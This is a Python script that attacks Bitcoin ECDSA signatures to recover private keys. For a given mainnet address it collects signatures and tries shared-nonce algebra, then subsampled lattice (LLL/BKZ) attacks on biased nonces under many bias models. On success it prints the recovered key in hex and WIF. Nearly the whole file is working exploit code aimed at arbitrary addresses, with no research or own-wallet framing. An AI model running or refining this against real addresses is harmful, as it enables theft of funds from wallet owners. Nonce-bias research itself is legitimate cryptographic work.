#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Final lattice recovery – optimized for small datasets.
"""

import sys
import json
import requests
import struct
import hashlib
import time
import random
from typing import List, Dict, Optional, Tuple
from collections import defaultdict
from test_lattice_recovery import private_key_hex_to_wif, private_key_to_address, fetch_local_blockchain_data

import multiprocessing as mp
from functools import partial

try:
    from fpylll import IntegerMatrix, BKZ, LLL
    HAVE_FPYLLL = True
except ImportError:
    HAVE_FPYLLL = False

try:
    import coincurve
    HAVE_COINCURVE = True
except ImportError:
    HAVE_COINCURVE = False

try:
    from btc_sig_utils import N, parse_der_sig
except ImportError as exc:
    raise SystemExit("Missing 'btc_sig_utils.py' – cannot continue.") from exc

# =============================================================================
#  YOUR ORIGINAL UTILITY FUNCTIONS (copy them here)
# =============================================================================
# ... (double_sha256, parse_varint, ... etc.) ...

# =============================================================================
#  ALGEBRAIC CHECK – only shared-r (identical nonce)
# =============================================================================

def algebraic_relations(signatures: List[Dict]) -> Tuple[Optional[int], Optional[str]]:
    q = N
    m = len(signatures)
    if m < 2:
        return None, None

    data = []
    for sig in signatures:
        r, s, z = sig['r'], sig['s'], sig['z']
        s_inv = pow(s, -1, q)
        data.append((r, s, z, s_inv))

    r_map = {}
    for i, (r, s, z, s_inv) in enumerate(data):
        if r in r_map:
            j = r_map[r]
            r1, s1, z1, s1_inv = data[j]
            r2, s2, z2, s2_inv = data[i]
            if s1 == s2:
                continue
            try:
                k = ((z1 - z2) * pow(s1 - s2, -1, q)) % q
                d = ((s1 * k - z1) * pow(r1, -1, q)) % q
                verified = True
                for t_idx in range(m):
                    if t_idx == i or t_idx == j:
                        continue
                    rt, st, zt, st_inv = data[t_idx]
                    kt = ((zt + rt * d) * st_inv) % q
                    if kt != k:
                        verified = False
                        break
                if verified:
                    return d, "shared_r"
            except ValueError:
                continue
        else:
            r_map[r] = i
    return None, None

# =============================================================================
#  LATTICE SOLVER (multi-model) – unchanged
# =============================================================================

def build_hnp_matrix_general(signatures, bit_pos, bit_len, prefix=None):
    q = N
    m = len(signatures)
    dim = m + 2
    if bit_pos == 'top':
        L = 256 - bit_len
        K = q // (1 << L)
        shift = 1
    elif bit_pos == 'bottom':
        L = bit_len
        K = q // (1 << L)
        shift = pow(2, L, q)
        inv_shift = pow(shift, -1, q)
    else:
        raise ValueError("bit_pos must be 'top' or 'bottom'")

    mat = IntegerMatrix(dim, dim)
    for i, sig in enumerate(signatures):
        r, s, z = sig['r'], sig['s'], sig['z']
        s_inv = pow(s, -1, q)
        if bit_pos == 'top':
            if prefix is not None:
                z = (z - s * prefix * (1 << L)) % q
            t = (r * s_inv) % q
            u = (z * s_inv) % q
        else:
            r_adj = (r * inv_shift) % q
            z_adj = (z * inv_shift) % q
            t = (r_adj * s_inv) % q
            u = (z_adj * s_inv) % q
        mat[i, i] = q
        mat[m, i] = t
        mat[m + 1, i] = u
    mat[m, m] = K
    mat[m + 1, m + 1] = 1
    return mat, dim, K, L, shift

def check_lattice_solution_general(mat, dim, K, L, signatures, bit_pos, shift=1, prefix=None, threshold=0.95):
    q = N
    m = dim - 2
    best_x = None
    best_frac = 0.0
    for row in range(dim):
        scaled_x = mat[row, m]
        if scaled_x == 0 or scaled_x % K != 0:
            continue
        x = abs(scaled_x // K) % q
        if x == 0:
            continue
        passes = 0
        for sig in signatures:
            s_inv = pow(sig['s'], -1, q)
            k = ((sig['z'] + sig['r'] * x) * s_inv) % q
            if bit_pos == 'top':
                if prefix is not None:
                    if (k >> L) == prefix:
                        passes += 1
                else:
                    if (k >> L) == 0:
                        passes += 1
            else:
                if (k & ((1 << L) - 1)) == 0:
                    passes += 1
        frac = passes / len(signatures)
        if frac > best_frac:
            best_frac = frac
            best_x = x
        if frac >= threshold:
            return x, frac
    return best_x, best_frac

def solve_hnp_subset_general(signatures, bit_pos='top', bit_len=8, prefix=None,
                             block_size=24, timeout_seconds=30):
    if len(signatures) < 5:
        return None, 0.0
    try:
        mat, dim, K, L, shift = build_hnp_matrix_general(signatures, bit_pos, bit_len, prefix)
    except Exception:
        return None, 0.0
    try:
        LLL.reduction(mat)
    except Exception:
        return None, 0.0
    start = time.time()
    try:
        BKZ.reduction(mat, BKZ.Param(block_size=block_size, strategies=BKZ.DEFAULT_STRATEGY))
    except Exception:
        pass
    if time.time() - start > timeout_seconds:
        return None, 0.0
    return check_lattice_solution_general(mat, dim, K, L, signatures, bit_pos, shift, prefix)

# =============================================================================
#  SUBSAMPLING ATTACK – CORRECTED
# =============================================================================

def worker_lattice_task(signatures, sample_size, bit_pos, bit_len, prefix, block_size, timeout):
    """Worker for multiprocessing: picks a random subset and runs the lattice reduction."""
    subset = random.sample(signatures, sample_size)
    key, frac = solve_hnp_subset_general(subset, bit_pos, bit_len, prefix, block_size, timeout)
    if key is not None and frac > 0.90:
        # Verify globally using all signatures
        q = N
        if bit_pos == 'top':
            L = 256 - bit_len
            total_passes = 0
            for sig in signatures:
                s_inv = pow(sig['s'], -1, q)
                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
                if prefix is not None:
                    if (k >> L) == prefix:
                        total_passes += 1
                else:
                    if (k >> L) == 0:
                        total_passes += 1
            overall = total_passes / len(signatures)
        else:  # bottom
            L = bit_len
            total_passes = 0
            for sig in signatures:
                s_inv = pow(sig['s'], -1, q)
                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
                if (k & ((1 << L) - 1)) == 0:
                    total_passes += 1
            overall = total_passes / len(signatures)
        if overall > 0.90:
            return (key, overall, bit_pos, bit_len, prefix)
    return None


def subsample_attack_advanced_parallel(signatures,
                                       trials_per_size=300,
                                       block_sizes=[20, 24, 28],
                                       timeout=30,
                                       num_workers=None) -> Optional[int]:
    if not signatures:
        return None
    total = len(signatures)
    if total < 8:
        print("[!] Too few signatures (<8).")
        return None

    # Generate sample sizes
    if total > 100:
        sample_sizes = [80, 100, 120]
    else:
        raw = [int(total * f) for f in [0.6, 0.75, 0.9]]
        sample_sizes = sorted(set([max(10, min(total, x)) for x in raw]))
        if total >= 20 and 16 not in sample_sizes:
            sample_sizes.append(16)
        sample_sizes = sorted(set(sample_sizes))

    print(f"[*] Sample sizes: {sample_sizes} (total signatures: {total})")

    # Build model list
    models = []
    for bl in [6, 8, 10]:
        models.append(('top', bl, None))
        models.append(('bottom', bl, None))
    for c in range(8):
        models.append(('top', 8, c))
    random.shuffle(models)

    # Generate tasks
    tasks = []
    for sample_size in sample_sizes:
        if sample_size > total:
            sample_size = total
        if sample_size < 8:
            continue
        for block_size in block_sizes:
            for bit_pos, bit_len, prefix in models:
                for _ in range(trials_per_size):
                    tasks.append((signatures, sample_size, bit_pos, bit_len, prefix, block_size, timeout))

    print(f"[*] Total tasks: {len(tasks)}")
    if not tasks:
        return None

    if num_workers is None:
        num_workers = mp.cpu_count()
    print(f"[*] Using {num_workers} workers")

    with mp.Pool(processes=num_workers) as pool:
        # Use starmap with the module‑level worker
        for res in pool.starmap(worker_lattice_task, tasks, chunksize=10):
            if res is not None:
                key, overall, bit_pos, bit_len, prefix = res
                print(f"[+] Found key with overall confidence {overall:.2f} (model {bit_pos}_{bit_len}_prefix{prefix})")
                return key
    return None

# def subsample_attack_advanced(signatures,
#                               trials_per_size=300,
#                               block_sizes=[20, 24, 28],
#                               timeout=30) -> Optional[int]:
#     """
#     Try multiple bias models on random subsets.
#     Automatically chooses sample sizes based on total count:
#       - If total > 100: use [80, 100, 120]
#       - Else: use [int(total*0.6), int(total*0.75), int(total*0.9)] (clamped ≥10)
#     """
#     if not signatures:
#         return None
#     total = len(signatures)
#     if total < 8:
#         print("[!] Too few signatures (<8).")
#         return None

#     # Generate sensible sample sizes
#     if total > 100:
#         sample_sizes = [80, 100, 120]
#     else:
#         # Use fractions of total, ensuring at least 10 and at most total
#         raw = [int(total * f) for f in [0.6, 0.75, 0.9]]
#         sample_sizes = sorted(set([max(10, min(total, x)) for x in raw]))
#         # Add a smaller one if possible
#         if total >= 20 and 16 not in sample_sizes:
#             sample_sizes.append(16)
#         sample_sizes = sorted(set(sample_sizes))

#     print(f"[*] Sample sizes: {sample_sizes} (total signatures: {total})")

#     # Build model list (top-zero, bottom-zero, constant prefix 0..7)
#     models = []
#     for bl in [6, 8, 10]:
#         models.append(('top', bl, None))
#         models.append(('bottom', bl, None))
#     for c in range(8):   # only first 8 prefixes
#         models.append(('top', 8, c))

#     # Shuffle to avoid systematic bias
#     random.shuffle(models)

#     for sample_size in sample_sizes:
#         if sample_size > total:
#             sample_size = total
#         if sample_size < 8:
#             continue
#         for block_size in block_sizes:
#             for bit_pos, bit_len, prefix in models:
#                 model_name = f"{bit_pos}_{bit_len}" + (f"_prefix{prefix}" if prefix is not None else "")
#                 print(f"[*] Model {model_name}, sample={sample_size}, BKZ-{block_size} for {trials_per_size} trials")
#                 for trial in range(trials_per_size):
#                     subset = random.sample(signatures, sample_size)
#                     key, frac = solve_hnp_subset_general(subset, bit_pos, bit_len, prefix, block_size, timeout)
#                     if key is not None and frac > 0.90:
#                         # Global verification
#                         q = N
#                         if bit_pos == 'top':
#                             L = 256 - bit_len
#                             total_passes = 0
#                             for sig in signatures:
#                                 s_inv = pow(sig['s'], -1, q)
#                                 k = ((sig['z'] + sig['r'] * key) * s_inv) % q
#                                 if prefix is not None:
#                                     if (k >> L) == prefix:
#                                         total_passes += 1
#                                 else:
#                                     if (k >> L) == 0:
#                                         total_passes += 1
#                             overall = total_passes / len(signatures)
#                         else:
#                             L = bit_len
#                             total_passes = 0
#                             for sig in signatures:
#                                 s_inv = pow(sig['s'], -1, q)
#                                 k = ((sig['z'] + sig['r'] * key) * s_inv) % q
#                                 if (k & ((1 << L) - 1)) == 0:
#                                     total_passes += 1
#                             overall = total_passes / len(signatures)
#                         if overall > 0.90:
#                             print(f"[+] Found key with overall confidence {overall:.2f} (model {model_name})")
#                             return key
#     return None

# =============================================================================
#  CLUSTERING (time‑based) – unchanged
# =============================================================================

def cluster_signatures_by_time(signatures, time_window_hours=2):
    clusters = defaultdict(list)
    for sig in signatures:
        t = sig.get('time')
        if t is None:
            clusters[0].append(sig)
        else:
            bucket = int(t // (time_window_hours * 3600))
            clusters[bucket].append(sig)
    return list(clusters.values())

# =============================================================================
#  MAIN ORCHESTRATION
# =============================================================================

def recover_private_key(address: str) -> Optional[int]:
    signatures = fetch_local_blockchain_data(address)
    if not signatures:
        print("[X] No signatures found.")
        return None

    print(f"[+] Collected {len(signatures)} signatures.")

    # 1. Shared-r check
    key, desc = algebraic_relations(signatures)
    if key:
        print(f"[+] Algebraic relation found: {desc}")
        return key

    # 2. Subsampling lattice attack
    print("[*] Starting advanced subsampling lattice attack...")
    key = subsample_attack_advanced_parallel(signatures, trials_per_size=300, block_sizes=[20, 24, 28], timeout=30)
    if key:
        return key

    # 3. Time clustering
    print("[*] Trying time‑based clustering...")
    clusters = cluster_signatures_by_time(signatures, time_window_hours=1)
    for i, cluster in enumerate(clusters):
        if len(cluster) < 8:
            continue
        print(f"[*] Cluster {i}: {len(cluster)} signatures")
        key = subsample_attack_advanced_parallel(cluster, trials_per_size=200, block_sizes=[20, 24], timeout=30)
        if key:
            return key

    return None

# =============================================================================
#  MAIN ENTRY – with address verification
# =============================================================================

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 recover_final.py <bitcoin_address>")
        sys.exit(1)

    address = sys.argv[1]
    recovered_key = recover_private_key(address)

    if recovered_key:
        key_hex = f"{recovered_key:064x}"
        wif_comp = private_key_hex_to_wif(key_hex, compressed=True, mainnet=True)
        wif_uncomp = private_key_hex_to_wif(key_hex, compressed=False, mainnet=True)

        # Verify address
        addr_match = False
        if HAVE_COINCURVE:
            try:
                addr_comp = private_key_to_address(key_hex, compressed=True)
                addr_uncomp = private_key_to_address(key_hex, compressed=False)
                if addr_comp == address or addr_uncomp == address:
                    addr_match = True
            except Exception as e:
                print(f"[!] Verification error: {e}")

        if addr_match:
            print("\n" + "="*60)
            print("[🔥 SUCCESS] Private key recovered and verified!")
            print(f"HEX: {key_hex}")
            print(f"WIF (compressed)   : {wif_comp}")
            print(f"WIF (uncompressed) : {wif_uncomp}")
            print("="*60)
        else:
            print("\n[!] Candidate private key found but does NOT match target address.")
            print(f"    Target address : {address}")
            if HAVE_COINCURVE:
                try:
                    addr_comp = private_key_to_address(key_hex, compressed=True)
                    addr_uncomp = private_key_to_address(key_hex, compressed=False)
                    print(f"    Derived (comp)  : {addr_comp}")
                    print(f"    Derived (uncomp): {addr_uncomp}")
                except:
                    pass
            print("[*] This is a false positive – no usable bias found.")
    else:
        print("\n[❌ FAIL] No key recovered.")
        print("[*] The nonces are likely truly random or the bias is too subtle.")

if __name__ == "__main__":
    main()